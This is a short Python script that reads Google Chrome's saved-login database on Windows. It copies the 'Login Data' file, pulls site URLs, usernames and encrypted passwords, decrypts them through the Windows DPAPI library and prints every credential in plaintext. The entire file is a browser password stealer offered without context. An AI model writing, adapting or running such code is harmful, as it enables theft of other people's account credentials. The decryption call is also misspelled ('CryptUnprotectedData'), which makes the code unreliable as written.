import os, sqlite3, shutil, win32crypt
#pip install pywin32

db = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
db_copy = db + "2"
shutil.copyfile(db, db_copy)
connection = sqlite3.connect(db_copy)
query = connection.cursor()
query.execute("SELECT action_url, username_value, password_value FROM logins")
for site, login, password in query.fetchall():
    print(f"[+]{site}")
    password = win32crypt.CryptUnprotectedData(password)
    uncrypted_pwd = password[1].decode("ISO-8859-1")
    print(f"[!]{login} -> {uncrypted_pwd}")
    print("-----------------")
connection.close()
os.remove(db_copy)